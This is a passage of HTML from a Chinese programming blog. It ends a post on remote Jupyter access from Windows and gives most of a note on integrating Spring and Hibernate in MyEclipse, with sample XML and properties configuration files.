class="line"></span><br><span class="line"><span class="title">x</span> = np.random.uniform(<span class="number">1</span>, <span class="number">100</span>, <span class="number">100</span>)</span><br><span class="line"><span class="title">y</span> = np.random.uniform(<span class="number">1</span>, <span class="number">100</span>, <span class="number">100</span>)</span><br><span class="line"><span class="title">plt</span>.plot(x, y)</span><br><span class="line"><span class="title">plt</span>.show()</span><br><span class="line"></span><br><span class="line"><span class="type">XXXXXXXX</span></span><br></pre></td></tr></table></figure>
<h3 id="4-3-支持向量机下的鸢尾花的识别"><a href="#4-3-支持向量机下的鸢尾花的识别" class="headerlink" title="4.3 支持向量机下的鸢尾花的识别"></a>4.3 支持向量机下的鸢尾花的识别</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XXXX</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上述的演示，已经完成了windows10下使用xshell远程连接linux系统以及远程访问jupyter-notebook服务，并通过几个小例子来对其进行验证说明可以正常使用linux下的anaconda。虽然msi computer不支持在本机安装linux系统，但是我们依然可以在另一台computer中安装并远程进行访问，而且其中的优势也是显而易见的：</p>
<ul>
<li>并不像以前那样虚拟机和物理机都在同一台computer中运行，而是将其中一台computer作为linux服务器，然后使用xshell对其进行远程操作，在一定程度上减小其压力。</li>
<li>方便了各个进程之间的管理且易于操作</li>
<li>。。。。。。</li>
</ul>
<hr>
<div style="text-align: right">2018-09-23,By Zero</div>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2018/09/20/利用MyEclipse进行SSH项目整合/">基于MyEclipse的SSH框架整合</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-20
        </span><span class="post-category">
            <a href="/categories/Java/">Java</a>
            </span>
        </div>
    </header>

    <div class="post-content"><blockquote>
<p>以下内容为博主学习Struts+Spring+Hibernate框架时所写笔记，有点凌乱，还未整理。</p>
</blockquote>
<h2 id="1-将Spring与Hibernate进行整合"><a href="#1-将Spring与Hibernate进行整合" class="headerlink" title="1. 将Spring与Hibernate进行整合"></a><strong>1. 将Spring与Hibernate进行整合</strong></h2><h3 id="1-1-为项目添加Spring的开发支持"><a href="#1-1-为项目添加Spring的开发支持" class="headerlink" title="1.1 为项目添加Spring的开发支持"></a><strong>1.1 为项目添加Spring的开发支持</strong></h3><blockquote>
<p>在实际开发的过程中一定要先啊添加Spring而不是Hibernate，否则会出现难以捉摸的bug。</p>
</blockquote>
<h4 id="1-1-1-创建一个新的web项目SSHDemo"><a href="#1-1-1-创建一个新的web项目SSHDemo" class="headerlink" title="1.1.1 创建一个新的web项目SSHDemo"></a><strong>1.1.1 创建一个新的web项目SSHDemo</strong></h4><h4 id="1-1-2-添加Spring"><a href="#1-1-2-添加Spring" class="headerlink" title="1.1.2 添加Spring"></a><strong>1.1.2 添加Spring</strong></h4><blockquote>
<ul>
<li>configure facets</li>
<li>install spring facet</li>
<li>next勾上Spring Persistence，在这里面有个orm开发包，含有Hibernate整合、IBatis整合、JDO等整合。</li>
</ul>
</blockquote>
<h3 id="1-2-添加Hibernate"><a href="#1-2-添加Hibernate" class="headerlink" title="1.2 添加Hibernate"></a><strong>1.2 添加Hibernate</strong></h3><blockquote>
<ul>
<li>configure facets</li>
<li>install Hibernate, 暂时选择Hibernate4.1 facet，如果Hibernate交给了Spring管理，那么Hibernate不再需要HibernateSessionFactory工具类的生成，随后SessionFactory交给了Spring负责管理，但是需要生成hibernate.cfg.xml文件，这个文件不再进行数据库，只进行相关的</li>
<li>将Create SessionFactory class去掉，√上Create hibernate.cfg.xml file<br>-&gt; next</li>
<li>打开mysql：windows -&gt; perspective -&gt; open perspective -&gt; other -&gt; database explore -&gt; 之后就可以右键添加自己的数据库了</li>
<li>在上一步完成之后就可以在配置DB Driver的时候选择mysql了 -&gt; next -&gt; finish</li>
</ul>
</blockquote>
<h3 id="1-3-将Spring和Hibernate进行整合"><a href="#1-3-将Spring和Hibernate进行整合" class="headerlink" title="1.3 将Spring和Hibernate进行整合"></a><strong>1.3 将Spring和Hibernate进行整合</strong></h3><h4 id="1-3-1-修改hibernate-cfg-xml文件"><a href="#1-3-1-修改hibernate-cfg-xml文件" class="headerlink" title="1.3.1 修改hibernate.cfg.xml文件"></a><strong>1.3.1 修改hibernate.cfg.xml文件</strong></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='UTF-8'?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE hibernate-configuration PUBLIC</span></span><br><span class="line"><span class="meta">          "-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span></span><br><span class="line"><span class="meta">          "http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd"&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Generated by MyEclipse Hibernate Tools.                   --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hibernate-configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-factory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"show_sql"</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"format_sql"</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">session-factory</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">hibernate-configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="1-3-2-建立一个database-properties文件，用于保存所有数据连接的信息"><a href="#1-3-2-建立一个database-properties文件，用于保存所有数据连接的信息" class="headerlink" title="1.3.2 建立一个database.properties文件，用于保存所有数据连接的信息"></a><strong>1.3.2 建立一个database.properties文件，用于保存所有数据连接的信息</strong></h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="attribute">driver</span>=com.mysql.cj.jdbc.Driver</span><br><span class="line">db.<span class="attribute">url</span>=jdbc:mysql://localhost:3306/test?useSSL=true&amp;serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=UTF-8</span><br><span class="line">db.<span class="attribute">user</span>=root</span><br><span class="line">db.<span class="attribute">password</span>=123</span><br><span class="line"></span><br><span class="line">pool.<span class="attribute">max</span>=1</span><br><span class="line">pool.<span class="attribute">min</span>=1</span><br><span class="line">pool.<span class="attribute">init</span>=10</span><br><span class="line">pool.<span class="attribute">idle</span>=20</span><br></pre></td></tr></table></figure>
<h4 id="1-3-3-配置applicationContext-xml文件"><a href="#1-3-3-配置applicationContext-xml文件" class="headerlink" title="1.3.3 配置applicationContext.xml文件"></a><strong>1.3.3 配置applicationContext.xml文件</strong></h4><p>要想将Spring和Hibernate进行整合，那么就需要配置applicationContext.xml文件，以下是常用的配置步骤，每个步骤分别对应后面的代码。</p>
<blockquote>
<ul>
<li>在namespace中勾上context，用于添加Annotation支持</li>
<li>添加支持Annotation</li>
<li>通过classpath加载databasse.properties文件</li>
<li>配置数据库连接池</li>
<li>配置Hibernate的相关环境，SessionFactory可以打开Session</li>
<li>事务配置的声明</li>
<li>定义事务的切入点</li>
</ul>
</blockquote>
<ul>
<li><strong>添加支持Annotation</strong></li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置annotation的支持操作 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.tianxingjian"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>通过classpath加载databasse.properties文件</strong></li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在本程序中设置要导入的资源文件路径，直接通过classpath加载 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">"classpath:database.properties"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>配置数据库连接池</strong></li>
</ul>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="comment">&lt;!-- 配合数据库连接池 --&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">class</span>=<span class="string">"com.mchange.v2.c3p0.ComboPooledDataSource"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClass"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.driver&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"jdbcUrl"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.url&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.user&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.password&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxPoolSize"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.max&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"minPoolSize"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.min&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"initialPoolSize"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.init&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxIdleTime"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.idle&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>配置Hibernate的相关环境，SessionFactory可以打开Session</strong></li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置Hibernate的相关环境，SessionFactory可以打开Session --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sessionFactory"</span></span></span><br><span class="line"><span class="tag">		<span class="attr">class</span>=<span class="string">"org.springframework.orm.hibernate4.LocalSessionFactoryBean"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"configLocation"</span></span></span><br><span class="line"><span class="tag">			<span class="attr">value</span>=<span class="string">"classpath:hibernate.cfg.xml"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 就表示这个项目里面引用数据源关系 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>事务的配置声明</strong></li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 事务的配置声明 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">tx:annotation-driven</span> <span class="attr">transaction-manager</span>=<span class="string">"transactionManager"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">"txAdvice"</span> <span class="attr">transaction-manager</span>=<span class="string">"transactionManager"</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 定义一切与服务层有关的方法名称，只要是使用了特定的名称那么就会自动进行处理事务 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"insert*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"update*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"delete*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"add*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"edit*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"change*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"login*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"get*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"load*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"list*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>定义事务的切入点</strong></li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 定义事务的切入点 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">aop:config</span> <span class="attr">expose-proxy</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">expression</span>=<span class="string">"execution(* com.tianxingjian..service.*.*(..))"</span> <span class="attr">id</span>=<span class="string">"pointcut"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">"txAdvice"</span> <span class="attr">pointcut-ref</span>=<span class="string">"pointcut"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>_以上就是本次项目中applicationContext.xml文件的相关配置，完整的applicationContext.xml文件的代码如下：_</strong></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span></span><br><span class="line"><span class="xml">	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line"><span class="xml">	xmlns:p="http://www.springframework.org/schema/p"</span></span><br><span class="line"><span class="xml">	xmlns:tx="http://www.springframework.org/schema/tx"</span></span><br><span class="line"><span class="xml">	xmlns:context="http://www.springframework.org/schema/context"</span></span><br><span class="line"><span class="xml">	xmlns:aop="http://www.springframework.org/schema/aop"</span></span><br><span class="line"><span class="xml">	xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.1.xsd</span></span><br><span class="line"><span class="xml">		http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.1.xsd</span></span><br><span class="line"><span class="xml">		http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.1.xsd</span></span><br><span class="line"><span class="xml">		http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd"&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">	<span class="comment">&lt;!-- 配置annotation的支持操作 --&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.tianxingjian"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">	</span></span><br><span class="line"><span class="xml">	<span class="comment">&lt;!-- 在本程序中设置要导入的资源文件路径，直接通过classpath加载 --&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">"classpath:database.properties"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">	</span></span><br><span class="line"><span class="xml">	<span class="comment">&lt;!-- 配合数据库连接池 --&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">class</span>=<span class="string">"com.mchange.v2.c3p0.ComboPooledDataSource"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClass"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.driver&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"jdbcUrl"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.url&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.user&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.password&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxPoolSize"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.max&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"minPoolSize"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.min&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"initialPoolSize"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.init&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxIdleTime"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.idle&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">	<span class="comment">&lt;!-- 配置Hibernate的相关环境，SessionFactory可以打开Session --&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sessionFactory"</span></span></span></span><br><span class="line"><span class="xml">		class="org.springframework.orm.hibernate4.LocalSessionFactoryBean"&gt;</span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"configLocation"</span></span></span></span><br><span class="line"><span class="xml">			value="classpath:hibernate.cfg.xml"&gt;</span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="comment">&lt;!-- 就表示这个项目里面引用数据源关系 --&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"><span class="xml">	</span></span><br><span class="line"><span class="xml">	<span class="comment">&lt;!-- 配置事务处理，所有的事务都采用AOP的方式，本处只声明SessionFactory要进行事务处控制--&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"transactionManager"</span></span></span></span><br><span class="line"><span class="xml">		class="org.springframework.orm.hibernate4.HibernateTransactionManager"&gt;</span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"sessionFactory"</span> <span class="attr">ref</span>=<span class="string">"sessionFactory"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"><span class="xml">	</span></span><br><span class="line"><span class="xml">	<span class="comment">&lt;!-- 事务的配置声明 --&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">tx:annotation-driven</span> <span class="attr">transaction-manager</span>=<span class="string">"transactionManager"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">"txAdvice"</span> <span class="attr">transaction-manager</span>=<span class="string">"transactionManager"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="comment">&lt;!-- 定义一切与服务层有关的方法名称，只要是使用了特定的名称那么就会自动进行处理事务 --&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"insert*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"update*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"delete*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"add*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"edit*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"change*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"login*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"get*"</span> <span class="attr">propagation</span>=<span 